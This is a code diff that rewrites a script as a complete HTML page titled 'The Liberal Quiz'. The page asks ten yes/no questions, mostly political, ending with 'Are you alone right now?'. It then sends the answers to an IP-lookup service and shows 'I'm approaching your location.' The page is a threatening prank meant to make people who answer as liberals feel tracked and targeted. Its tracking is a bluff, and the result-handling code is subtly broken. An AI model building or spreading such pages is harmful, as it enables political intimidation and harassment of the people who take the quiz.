@@ -1,77 +1,171 @@
-const quizQuestions = [
-    "Do you support universal healthcare?",
-    "Are you in favor of stricter gun control laws?",
-    "Do you believe in climate change and support environmental regulations?",
-    "Are you pro-choice regarding abortion rights?",
-    "Do you support LGBTQ+ rights and same-sex marriage?",
-    "Are you in favor of increasing taxes on the wealthy?",
-    "Do you support a pathway to citizenship for undocumented immigrants?",
-    "Are you in favor of expanding social welfare programs?",
-    "Do you support renewable energy initiatives?",
-    "Are you alone right now?"
-];
-
-let currentQuestion = 0;
-let answers = [];
-
-function showQuestion(questionNumber) {
-    const questionText = document.getElementById('questionText');
-    const answerButtons = document.getElementById('answerButtons');
-    const progressBar = document.getElementById('progressBar');
-
-    questionText.textContent = quizQuestions[questionNumber];
-    answerButtons.innerHTML = '';
-
-    const yesButton = document.createElement('button');
-    yesButton.textContent = 'Yes';
-    yesButton.addEventListener('click', () => handleAnswer('Yes'));
-    answerButtons.appendChild(yesButton);
-
-    const noButton = document.createElement('button');
-    noButton.textContent = 'No';
-    noButton.addEventListener('click', () => handleAnswer('No'));
-    answerButtons.appendChild(noButton);
-
-    progressBar.style.width = `${(questionNumber / quizQuestions.length) * 100}%`;
-}
-
-function handleAnswer(answer) {
-    answers.push(answer);
-    currentQuestion++;
-    if (currentQuestion < quizQuestions.length) {
-        showQuestion(currentQuestion);
-    } else {
-        fetchDataAndDisplayResult();
-    }
-}
-
-async function fetchDataAndDisplayResult() {
-    const quizContainer = document.querySelector('.quiz-container');
-    quizContainer.innerHTML = '<h2>Processing your results...</h2>';
-
-    try {
-        // Replace this URL with your actual API endpoint
-        const response = await fetch('https://api.ipify.org?format=json', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ answers: answers }),
-        });
-
-        if (!response.ok) {
-            throw new Error('Network response was not ok');
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>The Liberal Quiz</title>
+    
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
-        const data = await response.json();
-        quizContainer.innerHTML = `I'm approaching your location. <h2>${data.message}</h2>`;
-    } catch (error) {
-        console.error('Error:', error);
-        quizContainer.innerHTML = '<h2>An error occurred while processing your results. Please try again later.</h2>';
-    }
-}
+        .quiz-container {
+            max-width: 600px;
+            width: 90%;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            animation: fadeIn 0.5s ease-out;
+        }
 
-// Start the quiz when the page loads
-window.onload = function() {
-    showQuestion(0);
-};
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        h1, h2 {
+            color: #333;
+            text-align: center;
+        }
+
+        button {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            background-color: #4CAF50;
+            color: white;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            animation: buttonPop 0.3s ease-out;
+        }
+
+        @keyframes buttonPop {
+            0% { transform: scale(0.95); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background-color: #e0e0e0;
+            border-radius: 5px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+
+        .progress {
+            width: 0%;
+            height: 100%;
+            background-color: #4CAF50;
+            transition: width 0.5s ease-out;
+        }
+    </style>
+</head>
+<body>
+    <div class="quiz-container">
+        <h1>The Liberal Quiz</h1>
+        <h2 id="questionText"></h2>
+        <div id="answerButtons"></div>
+        <div class="progress-bar">
+            <div class="progress" id="progressBar"></div>
+        </div>
+    </div>
+
+    <script>
+        const quizQuestions = [
+            "Do you support universal healthcare?",
+            "Are you in favor of stricter gun control laws?",
+            "Do you believe in climate change and support environmental regulations?",
+            "Are you pro-choice regarding abortion rights?",
+            "Do you support LGBTQ+ rights and same-sex marriage?",
+            "Are you in favor of increasing taxes on the wealthy?",
+            "Do you support a pathway to citizenship for undocumented immigrants?",
+            "Are you in favor of expanding social welfare programs?",
+            "Do you support renewable energy initiatives?",
+            "Are you alone right now?"
+        ];
+        
+        let currentQuestion = 0;
+        let answers = [];
+        
+        function showQuestion(questionNumber) {
+            const questionText = document.getElementById('questionText');
+            const answerButtons = document.getElementById('answerButtons');
+            const progressBar = document.getElementById('progressBar');
+        
+            questionText.textContent = quizQuestions[questionNumber];
+            answerButtons.innerHTML = '';
+        
+            const yesButton = document.createElement('button');
+            yesButton.textContent = 'Yes';
+            yesButton.addEventListener('click', () => handleAnswer('Yes'));
+            answerButtons.appendChild(yesButton);
+        
+            const noButton = document.createElement('button');
+            noButton.textContent = 'No';
+            noButton.addEventListener('click', () => handleAnswer('No'));
+            answerButtons.appendChild(noButton);
+        
+            progressBar.style.width = `${(questionNumber / quizQuestions.length) * 100}%`;
+        }
+        
+        function handleAnswer(answer) {
+            answers.push(answer);
+            currentQuestion++;
+            if (currentQuestion < quizQuestions.length) {
+                showQuestion(currentQuestion);
+            } else {
+                fetchDataAndDisplayResult();
+            }
+        }
+        
+        async function fetchDataAndDisplayResult() {
+            const quizContainer = document.querySelector('.quiz-container');
+            quizContainer.innerHTML = '<h2>Processing your results...</h2>';
+        
+            try {
+                // Replace this URL with your actual API endpoint
+                const response = await fetch('https://api.ipify.org?format=json', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ answers: answers }),
+                });
+        
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+        
+                const data = await response.json();
+                quizContainer.innerHTML = `I'm approaching your location. <br><h2>${data.message}</h2>`;
+            } catch (error) {
+                console.error('Error:', error);
+                quizContainer.innerHTML = '<h2>An error occurred while processing your results. Please try again later.</h2>';
+            }
+        }
+        
+        // Start the quiz when the page loads
+        window.onload = function() {
+            showQuestion(0);
+        };
+    </script>
+</body>
+</html>
